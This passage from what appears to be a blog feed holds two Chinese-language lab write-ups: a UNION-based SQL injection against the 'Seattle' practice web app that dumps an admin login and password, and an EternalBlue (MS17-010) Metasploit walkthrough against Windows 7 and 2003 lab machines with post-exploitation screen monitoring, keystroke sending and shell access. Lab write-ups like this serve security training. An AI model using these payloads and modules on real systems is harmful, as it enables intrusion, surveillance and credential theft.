class="hljs-number">2.4</span>.<span class="hljs-number">16</span>版本；运行在Fedora上<br>还检测到了OpenSSL的<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>d-fips版本，以及PHP的<span class="hljs-number">5.6</span>.<span class="hljs-number">14</span>版本，linux系统，内核有多个发型版本<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919082601869.png" alt="image-20230919082601869"></p><p>可以先看看80端口的服务，访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">点击图中的两处可一获得一个pdf文档，文档中会给你许多的提示<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230919084745998.png" alt="image-20230919084745998"></p><p><img src="/2023/09/19/seattle/image-20230921104450907.png" alt="image-20230921104450907"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h3><p>点击Vinyl，可能存在注入点：</p><p><img src="/2023/09/19/seattle/image-20230921104702924.png" alt="image-20230921104702924"></p><p>输入万能公式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">2</span>  //存在sql注入漏洞，经过判断是数字型的注入漏洞<br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230921104739495.png" alt="image-20230921104739495"></p><p>判断回显字段数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">order</span> by <span class="hljs-number">5</span>  -- +   //判断出回显字段数是<span class="hljs-number">5</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/09/19/seattle/image-20230921104938101.png" alt="image-20230921104938101"></p><p>开始爆数据：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +   //得到数据库名 seattle</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //获得数据库的版本  10.0.23-MariaDB</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //获得数据库的用户  root@localhost</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@basedir,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +  //获取数据库的安装目录 /usr</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@plugin_dir,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //查看plugin的安装路径/usr/lib64/mysql/plugin/</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@version_compile_os,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- +//查询当前的操作系统：Linux</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,@@version_compile_machine,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">-- + //查询操作系统是多少位x86_64</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-comment">-- +  // 得到表名 tblBlogs,tblMembers,tblProducts</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;tblMembers&#x27;</span> <span class="hljs-comment">-- +    //得到字段名  id,username,password,session,name,blog,admin</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,username,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> seattle.tblMembers<span class="hljs-comment">-- +  //得到账户名admin@seattlesounds.net</span><br>?<span class="hljs-keyword">type</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">password</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">session</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;|&#x27;</span>,blog,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-keyword">admin</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> seattle.tblMembers<span class="hljs-comment">-- + //爆出表中的所有数据admin@seattlesounds.net|Assasin1|4cff8a69eb2824aebd478b9745ba6955|Admin|1|1</span><br><br></code></pre></td></tr></table></figure><p>得到一个登录名和密码：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">账户：<span class="hljs-literal">admin</span>@seattlesounds.net   密码：Assasin1 名字：<span class="hljs-literal">admin</span><br></code></pre></td></tr></table></figure><p>点击mycount进入到登录页面：</p><p><img src="/2023/09/19/seattle/image-20230921144547869.png" alt="image-20230921144547869"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="永恒之蓝："><a href="#永恒之蓝：" class="headerlink" title="永恒之蓝："></a>永恒之蓝：</h1><h2 id="window7："><a href="#window7：" class="headerlink" title="window7："></a>window7：</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">永恒之蓝是在Windows的SMB服务处理SMB <span class="hljs-built_in">v1</span>请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放<span class="hljs-number">445</span>文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序<br></code></pre></td></tr></table></figure><h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>： <span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><h3 id="目标靶机："><a href="#目标靶机：" class="headerlink" title="目标靶机："></a>目标靶机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">window</span> <span class="hljs-number">7</span> <span class="hljs-number">32</span>位：<span class="hljs-number">192.168.190.170</span>  //<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位的靶机所使用的一些参数不一样 需要目标的防火墙和杀毒软件关闭<br></code></pre></td></tr></table></figure><h3 id="使用工具："><a href="#使用工具：" class="headerlink" title="使用工具："></a>使用工具：</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><h3 id="使用arp-sweep扫描存活主机："><a href="#使用arp-sweep扫描存活主机：" class="headerlink" title="使用arp_sweep扫描存活主机："></a>使用arp_sweep扫描存活主机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">开启msf，使用msf的辅助模块auxiliary的arp_sweep<br>use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br></code></pre></td></tr></table></figure><p>进行存活主机的扫描：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091642313.png" alt="image-20230916091642313"></p><p>通过show options 命令来查看该模块所需要的参数：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">show</span> options  //发现在RHOSTS需要使用<span class="hljs-literal">yes</span>，此处需要我们设置网段<span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091731803.png" alt="image-20230916091731803"></p><p>通过set rhosts来设置需要扫描的网段：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> rhosts <span class="hljs-number">192.168</span><span class="hljs-number">.190</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>     //大小写不区分，设置完后，有需要的话可以通过<span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span> 来查看参数是否设置成功<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916092117973.png" alt="image-20230916092117973"></p><p>接下来通过run命令来运行该模块：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run     <span class="hljs-comment">//exploit命令也可以</span><br>可以看到扫描到了<span class="hljs-number">130</span>和<span class="hljs-number">174</span>，两个ip，其中<span class="hljs-number">130</span>是kali的，<span class="hljs-number">174</span>是目标靶机的<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916110944440.png" alt="image-20230916110944440"></p><h3 id="使用portscan扫描开放的端口："><a href="#使用portscan扫描开放的端口：" class="headerlink" title="使用portscan扫描开放的端口："></a>使用portscan扫描开放的端口：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan<span class="hljs-regexp">/tcp  /</span><span class="hljs-regexp">/同时使用show options来查看该模块需要的参数（rhosts）ip</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916093447957.png" alt="image-20230916093447957"></p><p>通过set rhosts来设置目标靶机ip：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111055385.png" alt="image-20230916111055385"></p><p>通过run命令来执行该模块扫描端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">run   <span class="hljs-regexp">//</span>扫到目标靶机开放的端口为：<span class="hljs-number">135</span> <span class="hljs-number">139</span> <span class="hljs-number">445</span> <span class="hljs-number">5357</span> <br><span class="hljs-regexp">//</span>特别是这个<span class="hljs-number">445</span>端口，是利用永恒之蓝的重点<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111149189.png" alt="image-20230916111149189"></p><p>发现目标靶机开放了445端口，为接下来的攻击提供了基础，在msf中search永恒之蓝的模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">search ms17_010  <span class="hljs-regexp">//m</span>s17_010为永恒之蓝的漏洞名称<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916105533668.png" alt="image-20230916105533668"></p><h3 id="通过利用smb-ms17-010模块："><a href="#通过利用smb-ms17-010模块：" class="headerlink" title="通过利用smb_ms17_010模块："></a>通过利用smb_ms17_010模块：</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">该模块是用来探查目标靶机是否存在永恒之蓝该漏洞<br>将rhosts 处改为目标靶机ip<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111255766.png" alt="image-20230916111255766"></p><p>接下来直接run：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run   <span class="hljs-comment">//通过扫描结果得知目标靶机易受到ms17_010攻击</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111437710.png" alt="image-20230916111437710"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="使用ms17的漏洞模块攻击靶机："><a href="#使用ms17的漏洞模块攻击靶机：" class="headerlink" title="使用ms17的漏洞模块攻击靶机："></a>使用ms17的漏洞模块攻击靶机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">由于我们的目标靶机为<span class="hljs-number">32</span>位的（和<span class="hljs-number">64</span>位的攻击方式不太一样），所以我们应该提前下载一些配置，参考大佬博客：<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_41617034/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">91051614</span><br></code></pre></td></tr></table></figure><p>利用exp的攻击模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue_32<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112113727.png" alt="image-20230916112113727"></p><p>通过show payloads命令查看payload模块：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112314337.png" alt="image-20230916112314337"></p><p>set payload命令设置：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">同时在模块参数中，PROCESSINJECT和RHOSTS都需要设置，<span class="hljs-number">32</span>位的PROCESSINJECT的参数设置为：explorer.exe<br>RHOSTS设置目标靶机：<span class="hljs-number">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112438945.png" alt="image-20230916112438945"></p><p>设置PROCESSINJECT的参数和RHOSTS的参数：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> processinject <span class="hljs-comment">explorer.exe</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112708775.png" alt="image-20230916112708775"></p><p>接下来尝试run：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">可以看到攻击成功，拿下了wi<span class="hljs-symbol">ndows7</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113157528.png" alt="image-20230916113157528"></p><h3 id="入侵后可以干的一些事情："><a href="#入侵后可以干的一些事情：" class="headerlink" title="入侵后可以干的一些事情："></a>入侵后可以干的一些事情：</h3><p>尝试一些命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">screenshot 屏幕截图  <span class="hljs-regexp">//</span>将win7的屏幕截图并且保持到kali的用户目录下<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113301165.png" alt="image-20230916113301165"></p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113341578.png" alt="image-20230916113341578"></p><p>成功入侵靶机电脑，你就可以干一些你想干点事情：</p><p>such as ：</p><p>监控对方电脑屏幕：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> vnc -i <br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114409908.png" alt="image-20230916114409908"></p><p>回车切换到会话端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>生成的这个屏幕监控会放一边<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114705026.png" alt="image-20230916114705026"></p><p>可以通过keyboard_send命令发送你想发送的信息：</p><p>先打开记事本，然后通过keyboard_send来发送想要发送的信息：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">execute -f notepad<br>keyboard_send nihao!!!<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115004580.png" alt="image-20230916115004580"></p><p>切换到测试的wind7靶机：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115124362.png" alt="image-20230916115124362"></p><p>监控页面：</p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115137069.png" alt="image-20230916115137069"></p><p>想要干更多的事情可以参考另一个大佬的博客：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuanyuzhou/</span>p/<span class="hljs-number">16118409</span>.html<br></code></pre></td></tr></table></figure><p>以上的操作均是在合法的环境中进行！</p><h2 id="续接：windows-2003："><a href="#续接：windows-2003：" class="headerlink" title="续接：windows 2003："></a>续接：windows 2003：</h2><h3 id="测试环境：-1"><a href="#测试环境：-1" class="headerlink" title="测试环境："></a>测试环境：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> <span class="hljs-number">2003</span> <span class="hljs-number">32</span>位<br></code></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>arp_sweep扫描目标存活主机;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br>run<br><span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916122820816.png" alt="image-20230916122820816"></p><p>portscan&#x2F;tcp模块扫描目标靶机开放的端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>run<br><span class="hljs-regexp">//</span>可以看到该靶机开放了<span class="hljs-number">445</span>端口<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123020511.png" alt="image-20230916123020511"></p><p>利用检查是否存在利用漏洞的模块来检测目标靶机：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_ms17_010<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>show options<br><span class="hljs-regexp">//</span>可以看到win2003存在该漏洞<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123158801.png" alt="image-20230916123158801"></p><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">尝试使用针对2007的漏洞脚本模块，发现不行<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124005735.png" alt="image-20230916124005735"></p><p>通过查询，发现，另一个漏洞模块可以利用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_psexec<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124113496.png" alt="image-20230916124113496"></p><p>该模块设置好目标靶机：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">即可攻击 /<span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124143136.png" alt="image-20230916124143136"></p><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124203548.png" alt="image-20230916124203548"></p><p>可以通过shell命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell  <span class="hljs-regexp">//</span>进入到目标靶机的终端<br>chcp <span class="hljs-number">56001</span> 改变当前会话的编码格式，减少乱码的出现<br></code></pre></td></tr></table></figure><p><img src="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124302179.png" alt="image-20230916124302179"></p><p>大部分功能可以照常使用</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
